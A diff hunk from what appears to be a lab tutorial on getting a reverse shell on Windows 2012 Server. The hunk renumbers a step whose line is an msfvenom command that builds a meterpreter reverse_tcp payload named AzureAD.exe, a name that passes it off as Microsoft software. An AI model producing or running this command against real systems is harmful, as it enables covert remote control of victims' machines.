@@ -14,7 +14,7 @@ This is a demonstration of obtaining a reverse shell on a Windows 2012 Server. T
 
   
   
-  *1.2 - (On a Kali Linux machine) sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP of Address of host> LPORT=<local port to listen on> -f <format> exe -o <output> ~/Downloads/AzureAD.exe
+  *2.1 - (On a Kali Linux machine) sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP of Address of host> LPORT=<local port to listen on> -f <format> exe -o <output> ~/Downloads/AzureAD.exe
   
 
 
